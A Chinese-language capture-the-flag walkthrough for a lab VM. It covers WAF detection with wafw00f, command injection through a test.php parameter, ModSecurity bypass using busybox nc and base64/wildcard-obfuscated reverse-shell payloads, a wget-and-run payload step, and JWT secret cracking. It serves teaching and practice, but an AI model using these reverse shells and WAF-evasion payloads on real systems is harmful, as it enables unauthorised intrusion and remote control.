# mynew
wafw00f waf枚举
crs规则机制
waf 可以安装再服务器网站php文件
绕过方法
fuzz wfuzz
| ;$ & 加base64 ？空格 混淆

#
IP发现在打开靶机就会提示！

1、nmap 192.168.3.88
80/tcp open  http

仅仅开启80web页面！

2、web信息枚举

访问：http://192.168.3.88/
发现这是apache服务页面！

dirb http://192.168.3.88/ -X .php
+ http://192.168.3.88/test.php (CODE:200|SIZE:1986)
发下存在test.php！

访问：http://192.168.3.88/test.php

提示：Read last visitor data 读取上次访问者数据
提示存在信息泄露！

点击后弹出：http://192.168.3.88/test.php?file=last.html
?file=   存在文件包含？？


3、绕过waf（一）识别waf
WAF类型：
wafw00f：
WAFw00f是Python脚本，用于检测网络服务器是否处于网络应用的防火墙（WAF ，Web application firewall）保护状态。

wafw00f http://192.168.3.88/test.php
Web 应用程序防火墙：modsecurity 

http://192.168.3.88/test.php?file=|pwd
/var/www/html   ---可以远程代码执行命令

http://192.168.3.88/test.php?file=--version
The site http://192.168.3.88 is behind a ModSecurity (OWASP CRS)

在PHP系统调用中使用cat命令调用！
---------------------------------------------
  -h, --help            显示帮助信息并退出
  -v, --verbose         更详细的输出，多个-v可以增加详细程度
  -a, --findall         寻找所有匹配的waf，不在匹配到第一个时停止
  -r, --noredirect      不遵循3xx响应给出的重定向
  -t TEST, --test=TEST  测试指定的waf
  -o OUTPUT, --output=OUTPUT
                       将输出写入csv、json或文本文件，具体取决于文件扩展名。对于stdout，指定-作为文件名。
  -i INPUT, --input-file=INPUT
                        从文件中读取目标。输入格式可以是csv，json或文本。对于csv和json，需要一	个“url”的列名或元素					      
  -l, --list            列出所有wafw00f能检测的waf
  -p PROXY, --proxy=PROXY
                        使用http代理来发送请求, 例如:
                        http://hostname:8080, socks5://hostname:1080,
                        http://user:pass@hostname:8080
  -V, --version         打印现在的wafw00f版本并退出.
  -H HEADERS, --headers=HEADERS
                        通过文本文件传递自定义header以覆盖默认header设置。
---------------------------------------------
ModSecurity waf！
ModSecurity是一个入侵探测与阻止的引擎，它主要是用于Web应用程序所以也可以叫做Web应用程序防火墙.它可以作为Apache Web服务器的一个模块或单独的应用程序来运行。ModSecurity的目的是为增强Web应用程序的安全性和保护Web应用程序避免遭受来自已知与未知的攻击。
https://github.com/SpiderLabs/ModSecurity  ---开源
https://github.com/SpiderLabs/owasp-modsecurity-crs


4、绕过waf（二）模糊测试Fuzz

wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/All_attack.txt http://192.168.3.88/test.php?file=FUZZ    ---正常模糊测试执行命令
-c 输出颜色
-z payload

wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/All_attack.txt --hc 404,403 http://192.168.3.88/test.php?file=FUZZ   ---加hc过滤

深入参考：
https://blog.csdn.net/qq_17204441/article/details/102279118



根据文章：
https://www.freebuf.com/articles/web/184414.html
默认情况下，Bash会像Perl那样处理未初始化的变量：即视为空字符串！
msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.2.157 lport=4455 -f elf > shell
http://192.168.3.88/test.php?file=dayu; $u wget http://192.168.3.86:8089/shell1 -o /tmp/shell
http://192.168.3.88/test.php?file=dayu; $u ls /tmp
http://192.168.3.88/test.php?file=dayu; $u chmod 777 /tmp/shell1
nc -vlp 4455
http://192.168.3.88/test.php?file=dayu; $u /tmp/shell1

这里会有个坑，就是文件空间满了需要删除！


5、绕过waf（三）

分号“;” 隔离绕过waf！

可以在不受限制和不同的二进制文件中执行命令来绕过本地安全限制！

二进制文件的列表：https://gtfobins.github.io/

最终发现：https://gtfobins.github.io/gtfobins/busybox/可以绕过waf

http://192.168.3.88/test.php?file=dayu;busybox nc 192.168.3.86 6666 -e sh
http://192.168.3.88/test.php?file=dayu;busybox nc 192.168.3.86 6666 -e sh -i

加入个 -i 就可以直接获得正常稳定shell！

有php过滤器
任意文件名；命令


6、绕过waf（四）

&/bin/echo bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjQuMTYyIDEzMzc=|/usr/bin/base64 -d|/bin/sh
直接访问会报错！需要混淆：
?问号在linux中以命令使用着，例如：/bin/echo可以通过替换一些字母来调用，/bin/ech?，仍然会执行相同的命令！

&/bin/ech? bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjQuMTYyIDEzMzc=|/u?r/bin/b?se64 -d|/bin/?h
还是不起作用！继续混淆：一些过滤器会禁止添加=或&到URI进行请求。
改&为%26   ---URL编码


nc -e /bin/sh 192.168.56.101 1337   ---这个是有== 号的不允许
echo "nc -e /bin/sh 192.168.56.101 1337 " | base64
echo "nc -e /bin/sh 192.168.56.101 1337  " | base64
绕过加空格就行！


http://192.168.4.161/test.php?file=%26/bin/ech?%20bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjQuMTYyIDEzMzc=|/u?r/b?n/b?se64%20-d|/b?n/sh

http://192.168.3.88/test.php?file=%26/bin/ech? bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjMuODYgMTMzNyAgICAgICAK|/u?r/b?n/b?se64 -d|/bin/?h

1）知道了cat执行命令，那么用&符号：
& 符号url编码是%26，结束并开始一个新的命令！
2）%20   ---空格
3）bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjMuODYgMTMzNyAgICAgICAK   ---base64编码
（这里== 也在黑名单上）
4）/u?r/b?n/b?se64%20-d是url编码的绕过方法：/usr/bin/base64 -d
5）|/b?n/sh也是一种绕过：|/bin/sh


7、稳定shell拓展
SHELL=/bin/bash script -q /dev/null
xport TERM=xterm-256color
ctrl + z
stty raw -echo
fg


8、内部信息收集

Linux version 4.13.0-39-generic   ---45010
Sudo version 1.8.20p2             ---CVE-2021-3156

uid=1000(bob) gid=1000(bob) groups=1000(bob),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare)   ---找到bob的密码，su bob登录用sudo -l提权


python3 -m http.server 8089
wget http://192.168.3.88:8089/._pw_
mv ._pw_ pw


10、提权---深入分析pw文件

初步怀疑这是一个密码base64解码看看：用点隔开了

1）base64
cat pw | base64 -d    
{"alg":"HS256","typ":"JWT"}base64: 输入无效
第一部分枚举到信息是hs256、JWT？发现内容包含“.”点不是有效的base64字符

过滤点：
cat pw | cut -d "." -f 2 | base64 -d
{"sub":"1234567890","name":"John Doe","iat":1516239022}base64: 输入无效
发现第二部分是1~0，人名，还是未解析完！

cat pw | cut -d "." -f 3 | base64 -d
�~y�P������"k��1�,��C��[}base64: 输入无效
发现第三部分是二进制！


2）JWT

将pw内容丢入谷歌，发现这是JWT（JSON Web 令牌）！----果然和第一部分验证的JWT是提示！

什么是JWT？ JSON Web Token（JWT）是一个开放的行业标准（RFC 7519），它定义了一种简介的、自包含的协议格式，用于在通信双方传递json对象，传递的信息经过数字签名可以被验证和信任。JWT可以使用HMAC算法或使用RSA的公 钥/私钥对来签名，防止被篡改。
参考：
https://blog.csdn.net/guohao_1/article/details/89951178

JWT 具有这种格式的三个部分：
base64(header).base64(payload).base64(signature)
1. header在 JSON 中指定算法和类型。
2. payload指定令牌的声明，也在 JSON 中。
3. signature是编码头和有效载荷的数字签名。

在线查看：
https://jwt.io/#debugger

开始破解：
proxychains git clone https://github.com/brendan-rius/c-jwt-cracker.git
cd jwt-cracker
apt-get install libssl-dev
make

./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg
Secret is "mlnV1"   ----等待几分钟


或者用：https://github.com/lmammino/jwt-cracker

































































